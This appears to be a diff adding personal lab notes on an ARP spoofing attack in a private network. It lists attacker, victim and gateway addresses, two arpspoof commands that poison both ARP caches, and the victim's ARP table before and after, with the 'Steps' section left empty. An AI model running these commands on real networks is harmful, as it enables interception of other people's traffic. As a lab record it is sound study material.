@@ -1,0 +1,55 @@
+Attacker:
+```````````
+IP: 192.168.206.129
+MAC: 91:04:a6
+
+Victim:
+````````
+IP: 192.168.206.135
+MAC: CF:17:9D
+
+GW:
+```
+IP: 192.168.206.2
+MAC: FC:6A:71
+
+
+
+On Attacker:
+````````````
+ARP Table
+# arp -a
+
+Terminal#1
+```````````
+# arpspoof -i eth0 -t 192.168.206.135 192.168.206.2
+
+Terminal#2
+```````````
+# arpspoof -i eth0 -t 192.168.206.2 192.168.206.135
+
+
+
+On Victim:
+```````````
+Before poisoning ARP Table
+# arp -a
+_gateway (192.168.206.2) at 00:50:56:fc:6a:71 [ether] on ens33? (192.168.206.129) at 00:0c:29:91:04:a6 [ether] on ens37
+
+After poisoning ARP Table
+# arp -a
+_gateway (192.168.206.2) at 00:0c:29:91:04:a6 [ether] on ens33
+? (192.168.206.129) at 00:0c:29:91:04:a6 [ether] on ens37
+
+
+Steps: 
+
+
+
+
+
+
+
+
+
+
